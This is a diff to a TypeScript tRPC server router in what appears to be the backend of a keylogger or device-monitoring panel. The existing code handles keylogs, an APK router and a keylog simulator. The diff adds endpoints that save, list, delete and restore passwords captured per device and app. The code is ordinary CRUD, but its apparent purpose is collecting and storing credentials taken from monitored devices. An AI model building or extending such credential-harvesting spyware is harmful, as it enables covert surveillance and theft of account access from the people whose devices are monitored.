@@ -3,7 +3,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME, ONE_YEAR_MS } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, deleteKeylogsByDevice } from "./db";
+import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, deleteKeylogsByDevice, savePassword, getPasswordsByDevice, deletePassword, restorePassword, getDeletedPasswords } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { apkRouter } from "./routers/apk";
 import { corporateRouter } from "./routers/corporate";
@@ -122,6 +122,51 @@ export const appRouter = router({
       .mutation(async ({ input, ctx }) => {
         await startKeylogSimulator(input.deviceId, ctx.user.id);
         return { success: true, message: "Simulador de keylogs iniciado" };
+      }),
+  }),
+
+  // ✅ NOVO: Passwords router
+  passwords: router({
+    list: protectedProcedure
+      .input(z.object({ deviceId: z.string() }))
+      .query(async ({ input }) => {
+        return await getPasswordsByDevice(input.deviceId);
+      }),
+    
+    create: protectedProcedure
+      .input(z.object({
+        deviceId: z.string(),
+        appName: z.string(),
+        password: z.string(),
+      }))
+      .mutation(async ({ input, ctx }) => {
+        await savePassword({
+          deviceId: input.deviceId,
+          userId: ctx.user.id,
+          appName: input.appName,
+          password: input.password,
+        });
+        return { success: true };
+      }),
+    
+    delete: protectedProcedure
+      .input(z.object({ passwordId: z.number() }))
+      .mutation(async ({ input }) => {
+        await deletePassword(input.passwordId);
+        return { success: true };
+      }),
+    
+    restore: protectedProcedure
+      .input(z.object({ passwordId: z.number() }))
+      .mutation(async ({ input }) => {
+        await restorePassword(input.passwordId);
+        return { success: true };
+      }),
+    
+    deleted: protectedProcedure
+      .input(z.object({ deviceId: z.string() }))
+      .query(async ({ input }) => {
+        return await getDeletedPasswords(input.deviceId);
       }),
   }),
 
